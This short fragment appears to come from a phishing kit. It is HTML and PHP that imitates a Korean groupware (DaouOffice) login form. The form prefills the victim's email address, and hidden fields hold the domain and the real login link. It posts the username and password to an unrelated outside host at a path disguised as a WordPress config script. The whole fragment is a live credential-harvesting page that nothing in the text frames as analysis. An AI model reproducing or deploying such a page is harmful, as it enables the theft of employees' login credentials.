            ...
            <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
                <section class="login_box">
                    ...
                    <fieldset>
                        <legend>login</legend>
						<div class="login_id">
                            <input type="text" id="username" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" class="ipt_login login_wide" tabindex="1" placeholder="계정" onkeyup="javascript:clearAlert(event)" autocapitalize="off" style="ime-mode:inactive;" onpaste="javascript:trimSpace(event)"/>
                            <input type="hidden" id="username" name="domain" value="<?php echo $ddomain;?>"/>
                            <input type="hidden" id="username" name="sender" value="Daouoffice.com"/>
                            <input type="hidden" id="username" name="link" value="https://gw.<?php echo $ddomain;?>/login"/>
                        </div>
                        <div class="login_pw">
